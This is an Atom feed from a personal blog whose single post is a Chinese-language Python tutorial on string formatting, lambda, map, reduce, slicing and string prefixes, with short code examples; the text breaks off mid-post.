<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kidder1&#39;s Blog!</title>
  
  
  <link href="https://kidder1.github.io/atom.xml" rel="self"/>
  
  <link href="https://kidder1.github.io/"/>
  <updated>2023-08-14T12:38:57.765Z</updated>
  <id>https://kidder1.github.io/</id>
  
  <author>
    <name>Kidder1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python语言深入研究</title>
    <link href="https://kidder1.github.io/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/"/>
    <id>https://kidder1.github.io/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/</id>
    <published>2023-08-02T04:15:25.000Z</published>
    <updated>2023-08-14T12:38:57.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级写法"><a href="#高级写法" class="headerlink" title="高级写法"></a>高级写法</h1><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ol><li>使用f-strings（格式化字符串字面量）： 这是从Python 3.6版本开始提供的最现代、最简洁的字符串格式化方法。你可以在字符串前加上’f’或’F’，并在花括号{}内嵌入表达式。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line">formatted_string = <span class="string">f&quot;我的名字是<span class="subst">&#123;name&#125;</span>，我今年<span class="subst">&#123;age&#125;</span>岁。&quot;</span></span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Alice，我今年30岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用<code>.format()</code>方法： 这种方法允许你使用<code>format()</code>方法的参数替换字符串中的占位符。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Bob&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;&#125;，我今年&#123;&#125;岁。&quot;</span>.<span class="built_in">format</span>(name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Bob，我今年25岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用<code>%</code>运算符（C风格的字符串格式化）： 这种方法类似于C语言中的<code>%</code>运算符，是一种较旧的字符串格式化方法。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Charlie&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是%s，我今年%d岁。&quot;</span> % (name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Charlie，我今年35岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用<code>str.format()</code>方法配合位置或命名占位符： 这种方法允许更灵活地控制参数的位置。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Eve&quot;</span></span><br><span class="line">age = <span class="number">40</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;0&#125;，我今年&#123;1&#125;岁。&quot;</span>.<span class="built_in">format</span>(name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Eve，我今年40岁。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用命名占位符（Python 3.1+）</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;name&#125;，我今年&#123;age&#125;岁。&quot;</span>.<span class="built_in">format</span>(name=name, age=age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Eve，我今年40岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用<code>str.join()</code>方法： 这种方法用于将序列的元素用给定的字符串连接起来。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;苹果&quot;</span>, <span class="string">&quot;香蕉&quot;</span>, <span class="string">&quot;橙子&quot;</span>]</span><br><span class="line">formatted_string = <span class="string">&quot;、&quot;</span>.join(fruits)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;苹果、香蕉、橙子&quot;</span></span><br></pre></td></tr></table></figure><p>根据你的喜好和Python版本选择合适的方法。一般来说，f-strings由于其可读性和效率而被推荐使用。</p><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>匿名函数是一种在Python中定义简单函数的方式，也被称为lambda函数。与普通函数（def定义的函数）不同，匿名函数不需要使用def关键字来定义，而是使用lambda关键字。匿名函数通常用于简单的功能或需要临时使用的小规模函数。</p><p>匿名函数的语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure><ul><li>lambda：表示创建匿名函数的关键字。</li><li>arguments：表示函数的参数列表。</li><li>expression：表示函数的返回值。</li></ul><p>使用说明：</p><ol><li>匿名函数通常适用于简单的功能，不建议用于复杂逻辑的函数。</li><li>匿名函数返回一个函数对象，可以将其赋值给一个变量，也可以直接调用它。</li></ol><p>实际使用举例： 下面我们将使用匿名函数来实现一些简单的功能。</p><ol><li>计算两个数的和：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = <span class="keyword">lambda</span> x, y: x + y</span><br><span class="line">result = add(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：8</span></span><br></pre></td></tr></table></figure><ol start="2"><li>判断一个数是否为偶数：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_even = <span class="keyword">lambda</span> num: num % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">10</span>))  <span class="comment"># 输出：True</span></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">7</span>))   <span class="comment"># 输出：False</span></span><br></pre></td></tr></table></figure><ol start="3"><li>对列表进行排序：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;grape&quot;</span>]</span><br><span class="line">fruits.sort(key=<span class="keyword">lambda</span> fruit: <span class="built_in">len</span>(fruit))</span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># 输出：[&#x27;apple&#x27;, &#x27;grape&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用map()函数对列表元素进行平方运算：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared_numbers = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers))</span><br><span class="line"><span class="built_in">print</span>(squared_numbers)  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在函数中使用匿名函数：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">apply_operation</span>(<span class="params">func, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> func(x, y)</span><br><span class="line">result = apply_operation(<span class="keyword">lambda</span> a, b: a * b, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：12</span></span><br></pre></td></tr></table></figure><p>​请注意，在使用匿名函数时，要确保它们的功能简单且易于理解。</p><h2 id="map方法"><a href="#map方法" class="headerlink" title="map方法"></a>map方法</h2><p><code>map()</code> 是 Python 内置的函数之一，用于将一个函数（或其他可调用对象）应用于一个或多个序列（如列表、元组等）的每个元素，并将结果组成一个新的可迭代对象。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(function, iterable, ...)</span><br></pre></td></tr></table></figure><ul><li><code>function</code>: 是一个函数或其他可调用对象，用于处理每个输入元素。</li><li><code>iterable</code>: 是一个或多个序列，可以是列表、元组、集合等。</li></ul><p><code>map()</code> 将会返回一个 <code>map</code> 对象，你可以将其转换成列表或其他类型的可迭代对象，如需要的话。</p><p>使用说明：</p><ol><li><code>map()</code> 接受一个或多个序列，它们的长度应该相同。如果传入多个序列，那么 <code>function</code> 将接受相同位置上的元素作为参数，这些元素组成一个元组传递给 <code>function</code>。</li><li><code>map()</code> 不会修改原始的输入序列，而是返回一个新的可迭代对象，其中包含了 <code>function</code> 处理后的结果。</li></ol><p>实际使用举例： 下面我们通过几个例子来说明 <code>map()</code> 的用法。</p><ol><li>将列表中的每个元素求平方：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared_numbers = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(squared_numbers))  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure><ol start="2"><li>将两个列表对应位置的元素相加：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list2 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line">sum_result = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x + y, list1, list2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(sum_result))  <span class="comment"># 输出：[11, 22, 33]</span></span><br></pre></td></tr></table></figure><ol start="3"><li>将字符串列表中的单词变为大写：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;python&quot;</span>]</span><br><span class="line">upper_words = <span class="built_in">map</span>(<span class="built_in">str</span>.upper, words)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(upper_words))  <span class="comment"># 输出：[&#x27;HELLO&#x27;, &#x27;WORLD&#x27;, &#x27;PYTHON&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用 <code>map()</code> 转换多个序列：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squares = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">addition = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x + y, numbers, squares)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(addition))  <span class="comment"># 输出：[2, 6, 12, 20, 30]</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用 <code>map()</code> 转换多个序列并取平均值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scores1 = [<span class="number">85</span>, <span class="number">90</span>, <span class="number">78</span>]</span><br><span class="line">scores2 = [<span class="number">92</span>, <span class="number">88</span>, <span class="number">95</span>]</span><br><span class="line">scores3 = [<span class="number">80</span>, <span class="number">85</span>, <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">average = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y, z: (x + y + z) / <span class="number">3</span>, scores1, scores2, scores3)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(average))  <span class="comment"># 输出：[85.66666666666667, 87.66666666666667, 87.0]</span></span><br></pre></td></tr></table></figure><p>总结：<code>map()</code> 是一个很有用的函数，可以简化对序列元素的处理，并且能够在一行代码中完成一些常见的数据转换操作。</p><h2 id="reduce方法"><a href="#reduce方法" class="headerlink" title="reduce方法"></a>reduce方法</h2><p><code>reduce()</code> 是 Python 中 <code>functools</code> 模块提供的函数，用于对一个序列（如列表或元组）中的元素逐个进行合并处理，最终返回一个结果。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functools.reduce(function, iterable[, initializer])</span><br></pre></td></tr></table></figure><ul><li><code>function</code>: 是一个二元函数，接受两个参数，并返回一个结果。</li><li><code>iterable</code>: 是一个序列，可以是列表、元组、集合等。</li><li><code>initializer</code>（可选）: 是初始值，如果提供了 <code>initializer</code>，则会在处理序列元素之前将其作为初始值传递给 <code>function</code>。</li></ul><p><code>reduce()</code> 在 Python 2 中是内置函数，但在 Python 3 中已经移至 <code>functools</code> 模块。所以在 Python 3 中使用 <code>reduce()</code> 需要先导入 <code>functools</code> 模块。</p><p>使用说明：</p><ol><li><code>reduce()</code> 首先将序列中的前两个元素传递给 <code>function</code>，得到一个结果。</li><li>然后将上一步的结果和序列中的下一个元素传递给 <code>function</code>，再得到一个结果。</li><li>依次类推，将每个元素和上一步的结果传递给 <code>function</code>，直到处理完所有元素，得到最终结果。</li></ol><p>实际使用举例： 下面我们通过几个例子来说明 <code>reduce()</code> 的用法。</p><ol><li>计算列表中所有元素的累积乘积：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">product = reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"><span class="built_in">print</span>(product)  <span class="comment"># 输出：120</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用初始值计算列表中所有元素的累积和：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">initial_value = <span class="number">10</span></span><br><span class="line">sum_result = reduce(<span class="keyword">lambda</span> x, y: x + y, numbers, initial_value)</span><br><span class="line"><span class="built_in">print</span>(sum_result)  <span class="comment"># 输出：25</span></span><br></pre></td></tr></table></figure><ol start="3"><li>将字符串列表中的单词拼接成一个句子：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">words = [<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>, <span class="string">&quot;Python&quot;</span>]</span><br><span class="line">sentence = reduce(<span class="keyword">lambda</span> x, y: x + <span class="string">&quot; &quot;</span> + y, words)</span><br><span class="line"><span class="built_in">print</span>(sentence)  <span class="comment"># 输出：&quot;Hello World Python&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用 <code>reduce()</code> 找到列表中的最大值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">15</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">45</span>]</span><br><span class="line">max_value = reduce(<span class="keyword">lambda</span> x, y: x <span class="keyword">if</span> x &gt; y <span class="keyword">else</span> y, numbers)</span><br><span class="line"><span class="built_in">print</span>(max_value)  <span class="comment"># 输出：45</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用初始值计算列表中所有元素的平均值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">scores = [<span class="number">85</span>, <span class="number">90</span>, <span class="number">78</span>, <span class="number">92</span>, <span class="number">88</span>]</span><br><span class="line">initial_value = <span class="number">0</span></span><br><span class="line">average = reduce(<span class="keyword">lambda</span> x, y: x + y, scores, initial_value) / <span class="built_in">len</span>(scores)</span><br><span class="line"><span class="built_in">print</span>(average)  <span class="comment"># 输出：86.6</span></span><br></pre></td></tr></table></figure><p>总结：<code>reduce()</code> 是一个强大的函数，可以用于处理多个元素之间的累积运算，但在 Python 3 中需要导入 <code>functools</code> 模块才能使用。在实际使用中，要确保传递给 <code>reduce()</code> 的函数符合合并运算的要求。</p><h3 id="注意二者区别"><a href="#注意二者区别" class="headerlink" title="注意二者区别"></a><strong>注意二者区别</strong></h3><ul><li><code>map()</code> 和 <code>reduce()</code> 是 Python 中两个用于处理序列的内置函数，它们都在 <code>functools</code> 模块中提供。</li></ul><p>主要区别如下：</p><ol><li>功能不同：<ul><li><code>map()</code>：用于对序列中的每个元素应用一个函数，并返回处理后的结果组成的可迭代对象。</li><li><code>reduce()</code>：用于对序列中的元素逐个进行合并处理，并返回一个最终结果。</li></ul></li><li>函数参数不同：<ul><li><code>map()</code> 接受一个函数和一个或多个序列（可迭代对象）作为参数，将函数应用于序列的每个元素，并返回结果组成的可迭代对象。</li><li><code>reduce()</code> 接受一个二元函数和一个序列（可迭代对象）作为参数，该二元函数处理序列中的两个元素，并返回一个结果，然后将该结果与下一个元素继续进行处理，直到处理完所有元素并得到最终结果。</li></ul></li><li>返回值不同：<ul><li><code>map()</code> 返回一个 <code>map</code> 对象，你可以将其转换成列表或其他类型的可迭代对象。</li><li><code>reduce()</code> 返回一个最终的结果，而不是一个可迭代对象。</li></ul></li><li>功能使用场景不同：<ul><li><code>map()</code> 适用于对序列中的每个元素进行相同的操作，例如对列表中的每个元素进行平方、转换为大写等。</li><li><code>reduce()</code> 适用于对序列中的元素进行合并运算，例如求和、求积、找到最大值等。</li></ul></li></ol><p>综上所述，<code>map()</code> 用于对序列中的元素逐个进行相同的处理，而 <code>reduce()</code> 用于对序列中的元素进行累积合并操作。它们在不同的场景下有不同的应用。</p><h3 id="例子：assic二进制转换"><a href="#例子：assic二进制转换" class="headerlink" title="例子：assic二进制转换"></a>例子：assic二进制转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line">b = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line"><span class="built_in">print</span>(reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> b]))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 对应输出</span></span><br><span class="line"><span class="string">49                          # ascii 1</span></span><br><span class="line"><span class="string">00110001                    # 1的二进制</span></span><br><span class="line"><span class="string">[0, 0, 1, 1, 0, 0, 0, 1]    # 1的二进制的list</span></span><br><span class="line"><span class="string">50                          # ascii 2</span></span><br><span class="line"><span class="string">00110010                    # 2的二进制</span></span><br><span class="line"><span class="string">[0, 0, 1, 1, 0, 0, 1, 0]    # 2的二进制的list</span></span><br><span class="line"><span class="string">51</span></span><br><span class="line"><span class="string">00110011</span></span><br><span class="line"><span class="string">[0, 0, 1, 1, 0, 0, 1, 1]</span></span><br><span class="line"><span class="string"># 二进制的list相加</span></span><br><span class="line"><span class="string">[0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h2><p>当涉及到字符串切片，有很多有趣且实用的用法。以下是一些示例，展示了字符串切片的不同写法和妙用：</p><ol><li>颠倒字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">reversed_string = s[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(reversed_string)  </span><br><span class="line"><span class="comment"># 输出: &quot;!dlroW ,olleH&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>每隔一个字符获取一个子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">every_other_char = s[::<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(every_other_char) </span><br><span class="line"><span class="comment"># 输出: &quot;Hlo ol!&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>获取从索引2到索引7之间的子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">substring = s[<span class="number">2</span>:<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(substring)  <span class="comment"># 输出: &quot;llo, W&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>获取从索引3开始，直到字符串结束的子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">substring = s[<span class="number">3</span>:]</span><br><span class="line"><span class="built_in">print</span>(substring)  <span class="comment"># 输出: &quot;lo, World!&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>获取从字符串开始直到索引7之前的子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">substring = s[:<span class="number">7</span>]</span><br><span class="line"><span class="built_in">print</span>(substring)  <span class="comment"># 输出: &quot;Hello, &quot;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>通过负数索引来获取子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">substring = s[-<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(substring)  <span class="comment"># 输出: &quot;World&quot;</span></span><br></pre></td></tr></table></figure><ol start="7"><li>获取最后3个字符的子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">es = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">last_three_chars = s[-<span class="number">3</span>:]</span><br><span class="line"><span class="built_in">print</span>(last_three_chars)  <span class="comment"># 输出: &quot;ld!&quot;</span></span><br></pre></td></tr></table></figure><ol start="8"><li>复制整个字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">copied_string = s[:]</span><br><span class="line"><span class="built_in">print</span>(copied_string)  <span class="comment"># 输出: &quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure><h2 id="字符串常用前缀解释"><a href="#字符串常用前缀解释" class="headerlink" title="字符串常用前缀解释"></a>字符串常用前缀解释</h2><p>在Python中，使用不同的前缀可以改变字符串的解释方式。</p><ol><li><p><code>b</code> 前缀（字节字符串）： 使用<code>b</code>前缀创建字节字符串，它表示以字节为单位的字符串，不会进行Unicode编码，适用于处理二进制数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary_data = <span class="string">b&quot;Hello, world!&quot;</span>  <span class="comment"># 创建字节字符串</span></span><br></pre></td></tr></table></figure></li><li><p><code>r</code> 前缀（原始字符串）： 使用<code>r</code>前缀创建原始字符串，该字符串中的转义字符（如<code>\n</code>）不会被转义，适用于正则表达式、文件路径等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex_pattern = <span class="string">r&quot;\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;&quot;</span>  <span class="comment"># 创建原始字符串，用于正则表达式</span></span><br><span class="line">file_path = <span class="string">r&quot;C:\Users\username\file.txt&quot;</span>  <span class="comment"># 创建原始字符串，用于文件路径</span></span><br></pre></td></tr></table></figure></li><li><p><code>u</code> 前缀（Unicode字符串）： 在Python 2.x 中，使用<code>u</code>前缀创建Unicode字符串，表示字符串是以Unicode编码的。在Python 3中，字符串默认为Unicode，因此不再需要显式使用<code>u</code>前缀。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode_string = <span class="string">u&quot;こんにちは&quot;</span>  <span class="comment"># 在Python 2中使用u前缀创建Unicode字符串</span></span><br></pre></td></tr></table></figure></li><li><p><code>f</code> 前缀（格式化字符串）： 使用<code>f</code>前缀创建格式化字符串，可以在字符串中插入变量或表达式，并使用花括号 <code>&#123;&#125;</code> 来界定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 